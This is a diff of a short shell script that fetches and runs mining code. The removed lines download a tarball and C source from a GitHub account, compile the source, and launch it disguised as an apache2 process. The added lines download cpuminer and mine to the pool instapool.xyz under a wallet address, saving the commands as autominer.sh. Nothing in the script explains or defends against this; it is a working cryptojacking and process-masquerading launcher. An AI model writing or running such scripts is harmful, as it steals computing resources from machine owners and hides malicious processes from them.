@@ -1,11 +1,7 @@
 #!/bin/sh
 
 
-wget https://github.com/thoeb292/thoeb292/raw/main/main.tar.gz
-tar xf main.tar.gz 
-./sgr.sh
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
+./cpuminer -a yespowersugar -o stratum+tcp://instapool.xyz:3032 -u sugar1qtn9h2lkja0geqs56mdkg6shq2d95jp2e8aj0z6.wtf
 
-wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
-gcc -o test mas.c 
-./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
-sleep 80000
+done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
